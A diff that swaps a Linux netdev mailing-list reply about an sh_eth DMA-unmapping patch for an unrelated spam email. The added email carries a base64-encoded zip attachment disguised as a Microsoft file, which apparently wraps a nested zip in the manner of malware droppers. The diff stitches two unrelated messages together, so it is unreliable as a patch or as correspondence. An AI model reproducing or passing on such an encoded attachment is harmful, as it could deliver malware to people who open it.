@@ -1,71 +1,55 @@
-From: Sergei Shtylyov <sergei.shtylyov@cogentembedded.com>
-Subject: Re: [PATCH] sh_eth: unmap DMA buffers when freeing rings
-Date: Mon, 17 Apr 2017 11:57:27 +0300
-Message-ID: <ef4b905e-15fa-d257-72b3-bb5ed7f55b80@cogentembedded.com>
-References: <20170416200157.111095876@cogentembedded.com>
+From: <kelley@colfaxcommunitynetwork.org>
+Subject: (unknown)
+Date: Mon, 17 Apr 2017 09:12:32 -0000
+Message-ID: <149242035248.22386.10630698097987421385@telenet.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8; format=flowed
-Content-Transfer-Encoding: 7bit
-Cc: linux-renesas-soc@vger.kernel.org
-To: netdev@vger.kernel.org
-Return-path: <linux-renesas-soc-owner@vger.kernel.org>
-In-Reply-To: <20170416200157.111095876@cogentembedded.com>
-Sender: linux-renesas-soc-owner@vger.kernel.org
-List-Id: netdev.vger.kernel.org
+Content-Type: application/zip; name="MICROSOFT-17050-netdev.zip"
+Content-Transfer-Encoding: base64
+To: "netdev" <netdev@vger.kernel.org>
+Return-path: <netdev-owner@vger.kernel.org>
+Received: from 154.129-31-94.telenet.ru ([94.31.129.154]:58907 "HELO
+        telenet.ru" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1753609AbdDQJMg (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Mon, 17 Apr 2017 05:12:36 -0400
+Subject: 
+Content-Disposition: attachment
+Sender: netdev-owner@vger.kernel.org
+List-ID: <netdev.vger.kernel.org>
 
-Hello!
-
-On 4/16/2017 11:01 PM, Sergei Shtylyov wrote:
-
-> The DMA API debugging (when enabled) causes:
->
-> WARNING: CPU: 0 PID: 1445 at lib/dma-debug.c:519 add_dma_entry+0xe0/0x12c
-> DMA-API: exceeded 7 overlapping mappings of cacheline 0x01b2974d
->
-> to be  printed after repeated initialization of the Ether device, e.g.
-> suspend/resume or 'ifconfig' up/down. This is because DMA buffers mapped
-> using dma_map_single() in sh_eth_ring_format() and sh_eth_start_xmit() are
-> never unmapped. Resolve this problem by unmapping the buffers when freeing
-> the descriptor  rings;  in order  to do it right, we'd have to add an extra
-> parameter to sh_eth_txfree() (we rename this function to sh_eth_tx_free(),
-> while at it).
->
-> Based on the commit a47b70ea86bd ("ravb: unmap descriptors when freeing
-> rings").
->
-> Signed-off-by: Sergei Shtylyov <sergei.shtylyov@cogentembedded.com>
->
-> ---
->  drivers/net/ethernet/renesas/sh_eth.c |  122 ++++++++++++++++++----------------
->  1 file changed, 67 insertions(+), 55 deletions(-)
->
-> Index: net/drivers/net/ethernet/renesas/sh_eth.c
-> ===================================================================
-> --- net.orig/drivers/net/ethernet/renesas/sh_eth.c
-> +++ net/drivers/net/ethernet/renesas/sh_eth.c
-> @@ -1127,12 +1127,70 @@ static struct mdiobb_ops bb_ops = {
->  	.get_mdio_data = sh_get_mdio,
->  };
->
-> +/* free Tx skb function */
-> +static int sh_eth_tx_free(struct net_device *ndev, bool sent_only)
-> +{
-> +	struct sh_eth_private *mdp = netdev_priv(ndev);
-> +	struct sh_eth_txdesc *txdesc;
-> +	int free_num = 0;
-> +	int entry;
-> +	bool sent;
-> +
-> +	for (; mdp->cur_tx - mdp->dirty_tx > 0; mdp->dirty_tx++) {
-> +		entry = mdp->dirty_tx % mdp->num_tx_ring;
-> +		txdesc = &mdp->tx_ring[entry];
-> +		sent = txdesc->status & cpu_to_le32(TD_TACT);
-
-    Oops, forgot to reverse the condition here. Which means I haven't goved in 
-enough testing... :-/
-
-> +		if (sent_only && !sent)
-> +			break;
-[...]
-
-MBR, Sergei
+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
+AACbBwAAAAA=
